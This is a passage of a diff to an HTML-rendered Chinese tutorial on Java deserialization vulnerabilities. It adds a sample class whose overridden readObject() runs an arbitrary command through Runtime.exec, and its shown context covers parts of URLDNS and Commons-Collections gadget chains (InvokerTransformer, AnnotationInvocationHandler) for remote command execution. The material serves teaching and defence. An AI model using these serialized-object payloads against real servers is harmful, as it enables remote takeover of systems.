+    <span class="token keyword">public</span> <span class="token class-name">MaliciousObject</span><span class="token punctuation">(</span><span class="token class-name">String</span> command<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>command <span class="token operator">=</span> command<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    
+    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span><span class="token class-name">ObjectInputStream</span> ois<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">{</span>
+        ois<span class="token punctuation">.</span><span class="token function">defaultReadObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        
+        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"readObject方法被调用，开始执行命令: "</span> <span class="token operator">+</span> command<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        
+        <span class="token keyword">try</span> <span class="token punctuation">{</span>
+            <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"命令执行成功！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p><strong>关键点：</strong></p>
+<ol>
+<li>
+<p><strong>必须实现<code>Serializable</code>接口</strong> - 这是序列化的前提条件</p>
+</li>
+<li>
+<p><strong>重写<code>readObject()</code>方法</strong> - 使用特定的方法签名：</p>
+<pre><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span><span class="token class-name">ObjectInputStream</span> ois<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span>
+</code></pre>
+</li>
+<li>
+<p><strong>调用<code>defaultReadObject()</code></strong> - 保证对象能正常反序列化：</p>
+<pre><code class="language-java">ois<span class="token punctuation">.</span><span class="token function">defaultReadObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre>
+<p>如果不调用此方法，对象的属性将无法被正确还原</p>
+</li>
+<li>
+<p><strong>反序列化自动触发</strong> - 当服务端调用<code>readObject()</code>反序列化数据时，会自动执行重写的<code>readObject()</code>方法中的恶意代码</p>
+</li>
+</ol>
+<p><strong>这就是反序列化漏洞的核心原理：</strong></p>
+<ul>
+<li>攻击者构造包含恶意<code>readObject()</code>方法的序列化对象</li>
+<li>服务端反序列化时自动执行<code>readObject()</code>中的代码</li>
+<li>从而实现远程命令执行(RCE)</li>
+</ul>
+<p><strong>为什么这样危险？</strong></p>
+<ul>
+<li>服务端无法控制<code>readObject()</code>中执行的代码</li>
+<li>只要反序列化数据，就会自动执行恶意代码</li>
+<li>攻击者可以执行任意系统命令，完全控制服务器</li>
 </ul>
 <h3>Java 反序列化漏洞利用链条分析</h3>
 <h4>URLDNS 链</h4>
@@ -21423,7 +21649,7 @@ r<span class="token punctuation">.</span><span class="token function">exec</span
 <pre><code class="language-java"><span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>
   <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">//返回Runtime类</span>
 
-  <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span>			<span class="token comment">//反射调用getMethod方法，然后getMethod方法再反射调用getRuntime方法，返回Runtime.getRuntime()方法</span>
+  <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span>   <span class="token comment">//反射调用getMethod方法，然后getMethod方法再反射调用getRuntime方法，返回Runtime.getRuntime()方法</span>
     <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token keyword">class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
     <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
 <span class="token punctuation">}</span>
@@ -21501,7 +21727,7 @@ declaredConstructor<span class="token punctuation">.</span><span class="token fu
 
     <span class="token punctuation">}</span>
 </code></pre>
-<p>核心逻辑就是 <code>Iterator var4 = this.memberValues.entrySet().iterator();</code> 和<code> var5.setValue(...)</code></p>
+<p>核心逻辑就是 <code>Iterator var4 = this.memberValues.entrySet().iterator();</code> 和<code>var5.setValue(...)</code></p>
 <p>memberValues 就是反序列化后得到的 Map，也是经过了 TransformedMap 修饰的对象，这里遍历了它的所有元素，并依次设置值。在调用 setValue 设置值的时候就会触发 TransformedMap 里注册的 Transform，进而执行我们为其精心设计的任意代码。</p>
 <p>所以，我们构造 POC 的时候，就需要创建一个<code>AnnotationInvocationHandler</code>对象，并将前面构造的<code>HashMap</code>设置进来</p>
 <pre><code class="language-java"><span class="token class-name">Class</span> cls <span class="token operator">=</span><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
